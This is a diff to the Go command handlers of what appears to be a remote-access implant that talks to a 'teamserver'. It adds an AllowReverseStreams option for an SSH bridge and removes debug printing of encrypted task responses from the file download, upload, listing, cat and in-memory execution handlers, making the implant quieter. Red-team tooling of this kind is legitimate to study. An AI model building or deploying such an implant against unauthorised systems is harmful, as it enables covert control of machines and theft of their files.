@@ -17,6 +17,11 @@ type CommandContext struct {
 	Implant *implant.ImplantMetadata
 	Encrypt *encrypt.Encrypt
 	HTTP    *Request
+
+	// AllowReverseStreams permits commands, such as the existing SSH bridge,
+	// that create an additional implant-to-teamserver connection. Bind mode
+	// deliberately leaves this false so all communication is teamserver-led.
+	AllowReverseStreams bool
 }
 
 // HandlePing handles the PING command
@@ -28,7 +33,6 @@ func HandlePing(ctx *CommandContext, payload []byte, tid [8]byte) string {
 	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
 	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
 	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
-	println(taskRestEnc)
 	return taskRestEnc
 }
 
@@ -44,7 +48,6 @@ func HandleDownload(ctx *CommandContext, payload []byte, tid [8]byte) string {
 		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
 		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
 		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
-		println(taskRestEnc)
 		return taskRestEnc
 	}
 
@@ -56,7 +59,6 @@ func HandleDownload(ctx *CommandContext, payload []byte, tid [8]byte) string {
 		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
 		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
 		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
-		println(taskRestEnc)
 		return taskRestEnc
 	}
 
@@ -67,7 +69,6 @@ func HandleDownload(ctx *CommandContext, payload []byte, tid [8]byte) string {
 	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
 	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
 	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
-	println(taskRestEnc)
 	return taskRestEnc
 }
 
@@ -104,7 +105,6 @@ func HandleUpload(ctx *CommandContext, payload []byte, tid [8]byte) string {
 	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
 	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
 	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
-	println(taskRestEnc)
 	return taskRestEnc
 }
 
@@ -126,7 +126,6 @@ func HandleCD(ctx *CommandContext, payload []byte, tid [8]byte) string {
 	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
 	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
 	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
-	println(taskRestEnc)
 	return taskRestEnc
 }
 
@@ -146,7 +145,6 @@ func HandlePWD(ctx *CommandContext, tid [8]byte) string {
 	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
 	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
 	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
-	println(taskRestEnc)
 	return taskRestEnc
 }
 
@@ -174,7 +172,6 @@ func HandleLS(ctx *CommandContext, payload []byte, tid [8]byte) string {
 		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
 		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
 		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
-		println(taskRestEnc)
 		return taskRestEnc
 	}
 
@@ -211,7 +208,6 @@ func HandleLS(ctx *CommandContext, payload []byte, tid [8]byte) string {
 	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
 	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
 	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
-	println(taskRestEnc)
 	return taskRestEnc
 }
 
@@ -230,7 +226,6 @@ func HandleMEMEXEC(ctx *CommandContext, payload []byte, tid [8]byte) string {
 		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
 		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
 		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
-		println(taskRestEnc)
 		return taskRestEnc
 	}
 
@@ -244,7 +239,6 @@ func HandleMEMEXEC(ctx *CommandContext, payload []byte, tid [8]byte) string {
 		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
 		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
 		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
-		println(taskRestEnc)
 		return taskRestEnc
 	}
 
@@ -266,7 +260,6 @@ func HandleMEMEXEC(ctx *CommandContext, payload []byte, tid [8]byte) string {
 		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
 		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
 		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
-		println(taskRestEnc)
 		return taskRestEnc
 	}
 
@@ -299,7 +292,6 @@ func HandleMEMEXEC(ctx *CommandContext, payload []byte, tid [8]byte) string {
 	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
 	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
 	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
-	println(taskRestEnc)
 	return taskRestEnc
 }
 
@@ -315,7 +307,6 @@ func HandleCAT(ctx *CommandContext, payload []byte, tid [8]byte) string {
 		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
 		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
 		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
-		println(taskRestEnc)
 		return taskRestEnc
 	}
 
@@ -327,7 +318,6 @@ func HandleCAT(ctx *CommandContext, payload []byte, tid [8]byte) string {
 		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
 		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
 		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
-		println(taskRestEnc)
 		return taskRestEnc
 	}
 
@@ -347,6 +337,5 @@ func HandleCAT(ctx *CommandContext, payload []byte, tid [8]byte) string {
 	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
 	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
 	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
-	println(taskRestEnc)
 	return taskRestEnc
 }
